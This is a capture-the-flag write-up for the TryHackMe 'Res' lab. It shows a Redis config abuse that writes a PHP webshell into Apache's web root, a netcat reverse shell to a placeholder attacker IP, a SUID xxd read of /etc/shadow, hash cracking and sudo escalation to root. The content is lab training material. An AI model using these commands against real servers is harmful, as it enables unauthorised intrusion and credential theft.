# [Res](https://tryhackme.com/room/res)

## Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

# Resy Set Go

### Scan the machine, how many ports are open?

1. Run a comprehensive port scan using nmap to identify all open ports and their services:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** 3

---

### What's is the database management system installed on the server?

1. From the nmap scan results, we can identify the database management system running on port 6379.

**Answer:** redis

---

### What port is the database management system running on?

1. The Redis service is running on its default port as shown in the nmap scan results.

**Answer:** 6379

---

### What's is the version of management system installed on the server?

_redis-cli_

1. Connect to the Redis server using the redis-cli client:

```bash
redis-cli -h <TARGET_IP>
info
```

**Answer:** 6.0.7

---

### Compromise the machine and locate user.txt

_What directory can you write to? Apache?_

1. Connect to the Redis server and configure it to write a PHP webshell to the Apache web directory:

```bash
redis-cli -h <TARGET_IP>
info
config set dir /var/www/html/
config set dbfilename redis.php
set test "<?php phpinfo(); ?>"
save
```

The `config set dir` command changes the working directory to Apache's web root, and `config set dbfilename` sets the output filename. We save a simple PHP info page first to test if it works.

2. Visit `http://<TARGET_IP>/redis.php` in your browser to verify that the PHP file was successfully created and is being executed by the Apache server.

3. Set up a netcat listener on your attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

4. Replace the test payload with a command execution webshell:

```bash
set test "<?php system($_GET['cmd']);?>"
save
```

5. Trigger the reverse shell by visiting the following URL: `http://<TARGET_IP>/redis.php?cmd=nc%20<ATTACKER_IP>%204444%20-e%20/bin/sh`

This executes a netcat reverse shell back to your listening machine.

6. Once you have shell access read the user flag:

```bash
cat /home/vianka/user.txt
```

<img width="518" height="276" alt="SCREEN01" src="https://github.com/user-attachments/assets/70d8e66a-f9f5-4ea1-9e6d-bc81f9ca05f8" />

---

### What is the local user account password?

1. Search for SUID binaries that might allow privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Results:**

```
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/var/www/html/xxd
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapperl
```

`xxd` has the SUID bit set in `/var/www/html/xxd` and `/usr/bin/xxd`, which is unusual and exploitable.

2. Use xxd with SUID to read the `/etc/shadow` file. Reference: [GTFOBins - xxd SUID](https://gtfobins.github.io/gtfobins/xxd/#suid)

```bash
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```

**Results:**

```
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

The `vianka` user has a password hash that we can crack.

3. Save the vianka user's hash line to a file on your attacking machine:

4. Use John the Ripper to crack the password hash using the rockyou.txt wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Answer:** beautiful1

---

### Escalate privileges and obtain root.txt

1. Switch to the vianka user account using the cracked password:

```bash
su vianka
# Password: beautiful1
```

2. Check what sudo privileges the vianka user has:

```bash
sudo -l
```

**Result:**

```
User vianka may run the following commands on ip-10-80-142-78:
    (ALL : ALL) ALL
```

The user vianka has full sudo privileges.

3. Use sudo to read the root flag:

```bash
sudo cat /root/root.txt
```

<img width="1034" height="355" alt="SCREEN02" src="https://github.com/user-attachments/assets/fd912b17-c094-4225-8cd1-bca5aa3e420f" />
